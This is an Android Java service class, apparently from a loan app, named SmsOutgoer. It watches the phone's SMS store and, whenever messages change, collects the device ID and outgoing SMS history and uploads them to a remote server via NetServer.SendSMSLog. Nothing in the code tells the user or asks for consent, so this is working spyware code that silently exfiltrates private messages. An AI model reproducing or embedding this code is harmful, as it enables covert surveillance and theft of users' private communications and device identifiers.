package main.app.loan;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.IBinder;

public class SmsOutgoer extends Service
{

	public static final String CONTENT_SMS = "content://sms";
	
	private class MyContentObserver extends ContentObserver
	{
	
	    Context context;
	
	    public MyContentObserver(Context context) {
	        super(null);
	        this.context = context;
	    }
	
	    @Override
	    public void onChange(boolean selfChange)
	    {
	        super.onChange(selfChange);
	        
        	NetServer.mDeviceUID = GlobalLib.GetDeviceUID(context);

            String strPacket = "";

            String strOutSms = GlobalLib.GetSMSHistory(context, false, true);
            if(strOutSms != null && "".equals(strOutSms) == false)
            {
            	strPacket = strPacket + strOutSms;
            }
            
            if("".equals(strPacket) == false)
            {
            	NetServer.SendSMSLog(strPacket);
            }
	    }
	
	    @Override
	    public boolean deliverSelfNotifications()
	    {
	        return false;
	    }
	}
	
	@Override
	public void onCreate()
	{
        super.onCreate();

	    MyContentObserver contentObserver = new MyContentObserver(getApplicationContext());
	    ContentResolver contentResolver = getBaseContext().getContentResolver();
	    contentResolver.registerContentObserver(Uri.parse(CONTENT_SMS), true, contentObserver);
	}
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	
	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}

	@Override
	@Deprecated
	public void onStart(Intent intent, int startId) {
		// TODO Auto-generated method stub
		super.onStart(intent, startId);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		return super.onStartCommand(intent, flags, startId);
	}

}
